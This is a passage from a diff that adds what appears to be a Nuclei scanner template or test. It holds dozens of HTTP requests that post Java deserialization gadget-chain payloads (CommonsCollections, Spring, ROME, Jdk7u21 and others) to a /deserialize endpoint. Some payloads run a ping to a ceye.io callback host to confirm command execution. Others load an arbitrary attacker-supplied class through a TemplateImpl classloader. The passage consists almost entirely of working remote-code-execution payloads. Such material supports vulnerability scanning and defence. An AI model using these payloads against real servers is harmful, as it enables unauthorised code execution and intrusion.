+        data={{generate_java_gadget_ext("CommonsCollections9", "Transform", "raw_cmd", "{\"cmd\":\"ping -c 1 nuclei.cc9.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollections10
+
+        data={{generate_java_gadget_ext("CommonsCollections10", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cc10.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollections11
+
+        data={{generate_java_gadget_ext("CommonsCollections11", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cc11.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollectionsK1
+
+        data={{generate_java_gadget_ext("CommonsCollectionsK1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cck1.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollectionsK2
+
+        data={{generate_java_gadget_ext("CommonsCollectionsK2", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.cck2.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: JBossInterceptors1
+
+        data={{generate_java_gadget_ext("JBossInterceptors1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.jbi1.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: JSON1
+
+        data={{generate_java_gadget_ext("JSON1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.json1.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: JavassistWeld1
+
+        data={{generate_java_gadget_ext("JavassistWeld1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.jw1.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: jdk7u21
+
+        data={{generate_java_gadget_ext("Jdk7u21", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.jdk7u21.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: jdk8u20
+
+        data={{generate_java_gadget_ext("Jdk8u20", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.jdk8u20.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: MozillaRhino1
+
+        data={{generate_java_gadget_ext("MozillaRhino1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.mr1.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: MozillaRhino2
+
+        data={{generate_java_gadget_ext("MozillaRhino2", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.mr2.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: ROME
+
+        data={{generate_java_gadget_ext("ROME", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.rome.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: Hibernate1
+
+        data={{generate_java_gadget_ext("Hibernate1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.hb1.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: Spring1
+
+        data={{generate_java_gadget_ext("Spring1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.sp1.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: Spring2
+
+        data={{generate_java_gadget_ext("Spring2", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.sp2.3p4u87.ceye.io\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: Vaadin1
+
+        data={{generate_java_gadget_ext("Vaadin1", "TemplateImpl", "RuntimeExec", "{\"cmd\":\"ping -c 1 nuclei.va1.3p4u87.ceye.io\"}", "base64")}}
+      # generate_java_gadget_classloader example
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: Click1 classloader
+
+        data={{generate_java_gadget_ext("Click1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsBeanutils1 classloader
+
+        data={{generate_java_gadget_ext("CommonsBeanutils1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsBeanutils1_183 classloader
+
+        data={{generate_java_gadget_ext("CommonsBeanutils1_183", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsBeanutils2_183 classloader
+
+        data={{generate_java_gadget_ext("CommonsBeanutils2_183", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsBeanutils2 classloader
+
+        data={{generate_java_gadget_ext("CommonsBeanutils2", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollections2 classloader
+
+        data={{generate_java_gadget_ext("CommonsCollections2", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollections3 classloader
+
+        data={{generate_java_gadget_ext("CommonsCollections3", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollections4 classloader
+
+        data={{generate_java_gadget_ext("CommonsCollections4", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollections8 classloader
+
+        data={{generate_java_gadget_ext("CommonsCollections8", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollections10 classloader
+
+        data={{generate_java_gadget_ext("CommonsCollections10", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollections11 classloader
+
+        data={{generate_java_gadget_ext("CommonsCollections11", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollectionsK1 classloader
+
+        data={{generate_java_gadget_ext("CommonsCollectionsK1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: CommonsCollectionsK2 classloader
+
+        data={{generate_java_gadget_ext("CommonsCollectionsK2", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: JBossInterceptors1 classloader
+
+        data={{generate_java_gadget_ext("JBossInterceptors1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: JSON1 classloader
+
+        data={{generate_java_gadget_ext("JSON1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: JavassistWeld1 classloader
+
+        data={{generate_java_gadget_ext("JavassistWeld1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: jdk7u21 classloader
+
+        data={{generate_java_gadget_ext("Jdk7u21", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: jdk8u20 classloader
+
+        data={{generate_java_gadget_ext("Jdk8u20", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: MozillaRhino1 classloader
+
+        data={{generate_java_gadget_ext("MozillaRhino1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: MozillaRhino2 classloader
+
+        data={{generate_java_gadget_ext("MozillaRhino2", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: ROME classloader
+
+        data={{generate_java_gadget_ext("ROME", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: Hibernate1 classloader
+
+        data={{generate_java_gadget_ext("Hibernate1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: Spring1 classloader
+
+        data={{generate_java_gadget_ext("Spring1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: Spring2 classloader
+
+        data={{generate_java_gadget_ext("Spring2", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
+      - |
+        POST /deserialize HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        gadget: Vaadin1 classloader
+
+        data={{generate_java_gadget_ext("Vaadin1", "TemplateImpl", "TemplateImplClassLoader", "{\"base64Class\":\"{{base64Class}}\"}", "base64")}}
